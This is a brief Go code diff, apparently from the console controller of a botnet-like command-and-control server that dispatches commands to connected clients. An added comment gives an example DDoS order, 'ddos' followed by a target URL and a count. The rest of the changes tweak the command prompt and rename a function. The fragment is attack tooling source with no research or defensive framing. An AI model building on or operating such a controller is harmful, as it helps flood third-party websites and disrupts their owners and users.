@@ -29,11 +29,9 @@ func (client *Client) Read() {
 	for {
 		line, err := client.reader.ReadString('\n')
 		if err == nil {
-			if client.connection != nil {
-				client.connection.outgoing <- line
-			}
 			fmt.Println("")
 			fmt.Println(line)
+			fmt.Print("enter new command: ")
 		} else {
 			break
 		}
@@ -74,7 +72,7 @@ func NewClient(connection net.Conn) *Client {
 	return client
 }
 
-func watchConsoleInput(conn net.Conn) {
+func watchConsoleInput(conn net.Conn) { //example: ddos http://web.com 4
 	newcommand := bufio.NewReader(os.Stdin)
 	for {
 		text, _ := newcommand.ReadString('\n')
@@ -92,7 +90,7 @@ func watchConsoleInput(conn net.Conn) {
 		}
 	}
 }
-func watchConnectionInput(client *Client) {
+func watchClientConnectionInput(client *Client) {
 	for clientList, _ := range allClients {
 		if clientList.connection == nil {
 			client.connection = clientList
@@ -122,7 +120,7 @@ func main() {
 			fmt.Println(err.Error())
 		}
 		client := NewClient(conn)
-		go watchConnectionInput(client)
+		go watchClientConnectionInput(client)
 		go watchConsoleInput(client.conn)
 	}
 }
